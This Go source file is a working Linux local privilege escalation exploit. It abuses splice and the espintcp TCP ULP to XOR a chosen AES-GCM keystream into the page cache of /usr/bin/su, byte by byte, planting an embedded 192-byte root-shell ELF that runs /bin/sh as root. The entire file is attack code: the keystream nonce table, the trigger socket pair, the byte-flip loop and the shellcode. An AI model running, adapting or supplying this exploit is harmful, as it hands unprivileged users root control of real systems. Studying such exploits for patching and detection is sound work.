package main

// Keystream table + byte-flip loop + TCP trigger pair.
//
// AES-GCM counter block for sequence position 2 (RFC 4106):
//   [salt(4)] || [IV(8)] || [BE32(2)]
// Encrypting this with AES-ECB under the 16-byte key gives the keystream block;
// byte 0 of the keystream XORs into position 0 of the ESP payload in the page cache.
//
// By choosing IV nonce to produce a desired keystream byte, we control what
// value is XOR'd into the target byte: desired = current XOR keystream.

import (
	"crypto/aes"
	"encoding/binary"
	"fmt"
	"os"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

const (
	fragLen         = 4096
	receiverPreULP  = 30 * time.Millisecond
	senderPreSplice = 1 * time.Millisecond
	receiverPostULP = 30 * time.Millisecond
	tcpULP          = 31 // TCP_ULP setsockopt option

	targetPath  = "/usr/bin/su"
	payloadLen  = 192
	entryOffset = 0x78
)

var (
	activeGCMIV  = [8]byte{0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc}
	activeESPSeq uint32 = 1
	spliceOff    int64
)

// shellELF is the 192-byte x86_64 root-shell ELF (same payload as dirtyfrag).
var shellELF = [payloadLen]byte{
	0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
	0x0f, 0x05, 0xb0, 0x69, 0x0f, 0x05, 0xb0, 0x74, 0x0f, 0x05, 0x6a, 0x00, 0x48, 0x8d, 0x05, 0x12,
	0x00, 0x00, 0x00, 0x50, 0x48, 0x89, 0xe2, 0x48, 0x8d, 0x3d, 0x12, 0x00, 0x00, 0x00, 0x31, 0xf6,
	0x6a, 0x3b, 0x58, 0x0f, 0x05, 0x54, 0x45, 0x52, 0x4d, 0x3d, 0x78, 0x74, 0x65, 0x72, 0x6d, 0x00,
	0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
}

// gcmKeystreamByte computes AES-GCM keystream byte 0 at counter block 2.
// counter_block = aeadKey[16:20](salt) || iv(8) || 0x00000002(BE)
func gcmKeystreamByte(iv [8]byte) byte {
	var block [16]byte
	copy(block[0:4], aeadKey[16:20]) // 4-byte salt
	copy(block[4:12], iv[:])
	block[15] = 2 // counter = 2 in big-endian

	c, _ := aes.NewCipher(aeadKey[0:16])
	var out [16]byte
	c.Encrypt(out[:], block[:])
	return out[0]
}

// buildKeystreamTable builds a 256-entry lookup: stream_byte → IV nonce.
// We vary the lower 32 bits of the 8-byte IV (upper 4 bytes fixed at 0xcccccccc).
// All 256 byte values appear within the first 65536 nonces.
func buildKeystreamTable() ([256]uint16, error) {
	var table [256]uint16
	var found [256]bool
	count := 0

	baseIV := [8]byte{0xcc, 0xcc, 0xcc, 0xcc, 0, 0, 0, 0}

	for nonce := uint32(0); nonce <= 0xffff && count < 256; nonce++ {
		iv := baseIV
		binary.BigEndian.PutUint32(iv[4:], nonce)
		b := gcmKeystreamByte(iv)
		if !found[b] {
			found[b] = true
			table[b] = uint16(nonce)
			count++
		}
	}

	if count != 256 {
		return table, fmt.Errorf("incomplete: %d/256 entries", count)
	}
	return table, nil
}

func readByteAt(path string, off int64) (byte, error) {
	f, err := os.Open(path)
	if err != nil {
		return 0, err
	}
	defer f.Close()
	var b [1]byte
	_, err = f.ReadAt(b[:], off)
	return b[0], err
}

// fragnesiaLPE runs the byte-by-byte XOR loop to write shellELF into
// the page cache of /usr/bin/su, one byte per TCP trigger invocation.
func fragnesiaLPE(table [256]uint16) error {
	changed, skipped := 0, 0

	for i := 0; i < payloadLen; i++ {
		cur, err := readByteAt(targetPath, int64(i))
		if err != nil {
			return fmt.Errorf("readByte[%d]: %w", i, err)
		}
		if cur == shellELF[i] {
			skipped++
			continue
		}

		// needKS = keystream byte needed so that: cur XOR needKS = desired
		needKS := cur ^ shellELF[i]
		nonce := table[needKS]

		activeGCMIV = [8]byte{0xcc, 0xcc, 0xcc, 0xcc, 0, 0, 0, 0}
		binary.BigEndian.PutUint32(activeGCMIV[4:], uint32(nonce))
		spliceOff = int64(i)

		if err := runTriggerPair(); err != nil {
			fmt.Fprintf(os.Stderr, "[!] trigger[%d]: %v\n", i, err)
		}
		activeESPSeq++
		changed++
	}

	fmt.Fprintf(os.Stderr, "[+] wrote %d bytes (%d changed, %d already correct)\n",
		payloadLen, changed, skipped)

	// Verify entry point bytes.
	b0, _ := readByteAt(targetPath, entryOffset)
	b1, _ := readByteAt(targetPath, entryOffset+1)
	if b0 != 0x31 || b1 != 0xff {
		return fmt.Errorf("verify failed: entry bytes = %02x %02x", b0, b1)
	}
	fmt.Fprintf(os.Stderr, "[+] /usr/bin/su page-cache patched (entry 0x%x = shellcode)\n", entryOffset)
	return nil
}

// runTriggerPair starts receiver and sender goroutines for one byte flip.
// The receiver installs TCP_ULP espintcp after the sender has spliced the
// file page into the TCP receive buffer, triggering in-place decryption.
func runTriggerPair() error {
	ready := make(chan struct{}, 1)
	errCh := make(chan error, 2)

	go func() { errCh <- runReceiver(ready) }()
	<-ready // wait until receiver is listening
	go func() { errCh <- runSender() }()

	var lastErr error
	for i := 0; i < 2; i++ {
		if err := <-errCh; err != nil {
			lastErr = err
		}
	}
	return lastErr
}

func runReceiver(ready chan<- struct{}) error {
	srv, err := unix.Socket(unix.AF_INET6, unix.SOCK_STREAM|unix.SOCK_CLOEXEC, 0)
	if err != nil {
		ready <- struct{}{}
		return fmt.Errorf("receiver socket: %w", err)
	}
	defer unix.Close(srv)

	unix.SetsockoptInt(srv, unix.SOL_SOCKET, unix.SO_REUSEADDR, 1) //nolint
	unix.SetsockoptInt(srv, unix.SOL_SOCKET, unix.SO_REUSEPORT, 1) //nolint

	sa := unix.SockaddrInet6{Port: tcpEncapPort}
	sa.Addr[15] = 1 // ::1
	if err := unix.Bind(srv, &sa); err != nil {
		ready <- struct{}{}
		return fmt.Errorf("receiver bind: %w", err)
	}
	if err := unix.Listen(srv, 1); err != nil {
		ready <- struct{}{}
		return fmt.Errorf("receiver listen: %w", err)
	}

	ready <- struct{}{} // sender may now connect

	cfd, _, err := unix.Accept(srv)
	if err != nil {
		return fmt.Errorf("receiver accept: %w", err)
	}
	defer unix.Close(cfd)

	// Wait for sender to have spliced file data into our receive buffer,
	// then install TCP_ULP espintcp — the kernel decrypts the queued data
	// in-place, XORing the AES-GCM keystream into the page-cache page.
	time.Sleep(receiverPreULP)

	ulp := []byte("espintcp\x00")
	if _, _, errno := unix.Syscall6(unix.SYS_SETSOCKOPT,
		uintptr(cfd), unix.IPPROTO_TCP, tcpULP,
		uintptr(unsafe.Pointer(&ulp[0])), uintptr(len(ulp)), 0); errno != 0 {
		return fmt.Errorf("TCP_ULP espintcp: %w", errno)
	}

	time.Sleep(receiverPostULP)
	return nil
}

func runSender() error {
	sock, err := unix.Socket(unix.AF_INET6, unix.SOCK_STREAM|unix.SOCK_CLOEXEC, 0)
	if err != nil {
		return fmt.Errorf("sender socket: %w", err)
	}
	defer unix.Close(sock)

	unix.SetsockoptInt(sock, unix.IPPROTO_TCP, unix.TCP_NODELAY, 1) //nolint

	dst := unix.SockaddrInet6{Port: tcpEncapPort}
	dst.Addr[15] = 1
	if err := unix.Connect(sock, &dst); err != nil {
		return fmt.Errorf("sender connect: %w", err)
	}

	// Build ESP-in-TCP frame prefix: 2-byte length word + 16-byte ESP header.
	// length = sizeof(prefix) + fragLen per C PoC (includes the len field itself).
	var prefix [18]byte
	binary.BigEndian.PutUint16(prefix[0:], uint16(18+fragLen))
	// SPI = 0x00000100 in big-endian
	prefix[2] = 0x00; prefix[3] = 0x00; prefix[4] = 0x01; prefix[5] = 0x00
	binary.BigEndian.PutUint32(prefix[6:], activeESPSeq) // SEQ
	copy(prefix[10:], activeGCMIV[:])                    // IV

	if _, err := unix.Write(sock, prefix[:]); err != nil {
		return fmt.Errorf("sender send prefix: %w", err)
	}

	time.Sleep(senderPreSplice) // let prefix reach receiver before splice

	fileFd, err := unix.Open(targetPath, unix.O_RDONLY, 0)
	if err != nil {
		return fmt.Errorf("sender open file: %w", err)
	}
	defer unix.Close(fileFd)

	var pfd [2]int
	if err := unix.Pipe(pfd[:]); err != nil {
		return fmt.Errorf("sender pipe: %w", err)
	}
	defer func() { unix.Close(pfd[0]); unix.Close(pfd[1]) }()

	// Splice fragLen bytes from the target file (at spliceOff) into the pipe.
	// This maps the file's page-cache page into the pipe buffer.
	off := spliceOff
	if _, err := unix.Splice(fileFd, &off, pfd[1], nil, fragLen, unix.SPLICE_F_MOVE); err != nil {
		return fmt.Errorf("sender splice file→pipe: %w", err)
	}

	// Splice pipe into the TCP socket — data enters the receiver's receive queue
	// as the body of the ESP-in-TCP record (ciphertext to be "decrypted").
	if _, err := unix.Splice(pfd[0], nil, sock, nil, fragLen, unix.SPLICE_F_MOVE); err != nil {
		return fmt.Errorf("sender splice pipe→tcp: %w", err)
	}

	return nil
}
